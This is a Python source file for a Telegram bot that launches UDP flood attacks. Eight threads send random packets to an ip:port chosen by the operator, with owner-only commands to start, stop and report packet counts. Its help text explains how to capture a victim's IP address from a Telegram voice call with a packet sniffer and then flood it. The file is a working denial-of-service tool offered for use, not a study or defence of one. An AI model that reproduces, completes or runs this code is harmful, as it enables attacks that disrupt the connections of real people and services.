# language: Python 3.11, file: main.py, target: headless (Render/Railway/VPS)
# pip install python-telegram-bot==21.6 telethon
# env vars: BOT_TOKEN, OWNER_ID, API_ID, API_HASH (optional userbot ke liye)

import asyncio
import os
import random
import socket
import time
import threading

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, ContextTypes
)

# ═══════════════════════════════════════════════
#  CONFIG — env vars se (Render dashboard me set karo)
# ═══════════════════════════════════════════════
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
OWNER_ID  = int(os.environ.get("OWNER_ID", "0"))
API_ID    = int(os.environ.get("API_ID", "0"))
API_HASH  = os.environ.get("API_HASH", "")
STRING_SESSION_NAME = os.environ.get("SESSION_NAME", "vc_user")

DEFAULT_DUR = 60
THREADS     = 8
PACKET_SIZE = (512, 1400)

if not BOT_TOKEN or not OWNER_ID:
    raise SystemExit("❌ BOT_TOKEN aur OWNER_ID env vars set karo")

JOBS = {}
BOT_USERNAME = None

# ═══════════════════════════════════════════════
#  FLOOD ENGINE
# ═══════════════════════════════════════════════
class Flood:
    def __init__(self, ip, port, duration):
        self.ip = ip
        self.port = port
        self.duration = duration
        self.packets = 0
        self.bytes_sent = 0
        self._stop = False
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.setblocking(False)

    def _payload(self):
        n = random.randint(*PACKET_SIZE)
        return bytes(random.getrandbits(8) for _ in range(n))

    def run(self):
        end = time.time() + self.duration
        while not self._stop and time.time() < end:
            try:
                p = self._payload()
                self.sock.sendto(p, (self.ip, self.port))
                self.packets += 1
                self.bytes_sent += len(p)
            except (BlockingIOError, OSError):
                pass
        self.sock.close()

    def stop(self):
        self._stop = True

# ═══════════════════════════════════════════════
#  JOB
# ═══════════════════════════════════════════════
class Job:
    def __init__(self, chat_id, ip, port, duration):
        self.chat_id = chat_id
        self.ip = ip
        self.port = port
        self.duration = duration
        self.started = time.time()
        self.floods = []
        self.stopped = False
        self.task = None

    def totals(self):
        return (sum(f.packets for f in self.floods),
                sum(f.bytes_sent for f in self.floods))

async def run_job(app, job):
    for _ in range(THREADS):
        f = Flood(job.ip, job.port, job.duration)
        job.floods.append(f)
        threading.Thread(target=f.run, daemon=True).start()

    await asyncio.sleep(job.duration)
    p, b = job.totals()
    try:
        await app.bot.send_message(
            job.chat_id,
            f"✅ *Attack Finished*\n"
            f"🎯 `{job.ip}:{job.port}`\n"
            f"⏱ {job.duration}s · {THREADS} threads\n"
            f"📦 {p:,} packets · {b/1024/1024:.1f} MB",
            parse_mode="Markdown")
    except Exception:
        pass
    JOBS.pop(job.chat_id, None)

# ═══════════════════════════════════════════════
#  MENUS
# ═══════════════════════════════════════════════
def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Attack IP", callback_data="m_attack")],
        [InlineKeyboardButton("⏹ Stop", callback_data="m_stop"),
         InlineKeyboardButton("📊 Status", callback_data="m_status")],
        [InlineKeyboardButton("🧹 Clear", callback_data="m_clear")],
        [InlineKeyboardButton("📖 Help", callback_data="m_help")],
    ])

def dur_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚡ 30s", callback_data="d_30"),
         InlineKeyboardButton("🔥 60s", callback_data="d_60")],
        [InlineKeyboardButton("💣 120s", callback_data="d_120"),
         InlineKeyboardButton("☠ 180s", callback_data="d_180")],
    ])

def is_owner(u):
    return u.effective_user.id == OWNER_ID

# ═══════════════════════════════════════════════
#  COMMANDS
# ═══════════════════════════════════════════════
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update): return
    await update.message.reply_text(
        "*🚀 IP Attack Bot*\n\n"
        f"Default: {DEFAULT_DUR}s · {THREADS} threads\n"
        "IP: HTTP Canary UDP filter se lo\n\n"
        "Choose:",
        parse_mode="Markdown", reply_markup=main_menu())

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update): return
    await update.message.reply_text(
        "*Commands:*\n"
        "`/attack <ip:port> [sec]`\n"
        "`/stop` `/status` `/clear`\n\n"
        "*IP kaise lo:*\n"
        "1. HTTP Canary start\n"
        "2. VC join, 10s bolo\n"
        "3. UDP filter → largest packet → ip:port\n"
        "4. `/attack 91.x.x.x:50000`",
        parse_mode="Markdown")

async def cmd_attack(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update): return
    cid = update.effective_chat.id
    if cid in JOBS:
        await update.message.reply_text("⚠ already running. /stop")
        return
    if not ctx.args:
        await update.message.reply_text("usage: /attack <ip:port> [sec]")
        return
    try:
        ip, port = ctx.args[0].split(":")
        port = int(port)
    except Exception:
        await update.message.reply_text("bad format. ip:port")
        return
    dur = DEFAULT_DUR
    if len(ctx.args) > 1:
        try: dur = min(int(ctx.args[1]), 600)
        except ValueError: pass

    job = Job(cid, ip, port, dur)
    JOBS[cid] = job
    job.task = asyncio.create_task(run_job(ctx.application, job))
    await update.message.reply_text(
        f"🚀 *Attack Started*\n"
        f"🎯 `{ip}:{port}`\n"
        f"⏱ {dur}s · {THREADS} threads",
        parse_mode="Markdown")

async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update): return
    cid = update.effective_chat.id
    job = JOBS.get(cid)
    if not job:
        await update.message.reply_text("nothing running.")
        return
    job.stopped = True
    for f in job.floods: f.stop()
    if job.task: job.task.cancel()
    JOBS.pop(cid, None)
    await update.message.reply_text("⏹ stopped.")

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update): return
    if not JOBS:
        await update.message.reply_text("no jobs.")
        return
    lines = ["*📊 Active:*"]
    for cid, j in JOBS.items():
        el = int(time.time() - j.started)
        p, _ = j.totals()
        lines.append(f"• `{j.ip}:{j.port}` | {el}/{j.duration}s | {p:,} pkt")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def cmd_clear(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update): return
    cid = update.effective_chat.id
    msg = await update.message.reply_text("🧹 clearing...")
    deleted = 0
    try:
        async for m in ctx.application.bot.get_chat_history(cid, limit=50):
            if m.from_user and m.from_user.id == ctx.application.bot.id:
                try: await m.delete(); deleted += 1
                except Exception: pass
    except Exception: pass
    await msg.edit_text(f"✅ deleted {deleted}")

# ═══════════════════════════════════════════════
#  CALLBACKS
# ═══════════════════════════════════════════════
async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_owner(update): return
    d = q.data
    cid = q.message.chat_id

    if d == "m_attack":
        await q.edit_message_text(
            "Duration choose, phir `/attack <ip:port> <sec>`:",
            parse_mode="Markdown", reply_markup=dur_menu())
    elif d == "m_stop":
        job = JOBS.get(cid)
        if job:
            job.stopped = True
            for f in job.floods: f.stop()
            if job.task: job.task.cancel()
            JOBS.pop(cid, None)
            await q.edit_message_text("⏹ stopped.")
        else:
            await q.edit_message_text("nothing running.")
    elif d == "m_status":
        job = JOBS.get(cid)
        if not job:
            await q.edit_message_text("no jobs.")
        else:
            el = int(time.time() - job.started)
            p, b = job.totals()
            await q.edit_message_text(
                f"📊 `{job.ip}:{job.port}`\n"
                f"⏱ {el}/{job.duration}s\n"
                f"📦 {p:,} pkt · {b/1024/1024:.1f} MB",
                parse_mode="Markdown")
    elif d == "m_clear":
        deleted = 0
        try:
            async for m in ctx.application.bot.get_chat_history(cid, limit=50):
                if m.from_user and m.from_user.id == ctx.application.bot.id:
                    try: await m.delete(); deleted += 1
                    except Exception: pass
        except Exception: pass
        await q.edit_message_text(f"✅ deleted {deleted}")
    elif d == "m_help":
        await q.edit_message_text(
            "/attack <ip:port> [sec]\n/stop /status /clear",
            reply_markup=main_menu())
    elif d.startswith("d_"):
        sec = int(d.split("_")[1])
        await q.edit_message_text(
            f"⏱ {sec}s. Ab bhejo:\n`/attack <ip:port> {sec}`",
            parse_mode="Markdown")

# ═══════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("clear", cmd_clear))
    app.add_handler(CallbackQueryHandler(on_callback))

    print("[+] bot starting (headless)...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()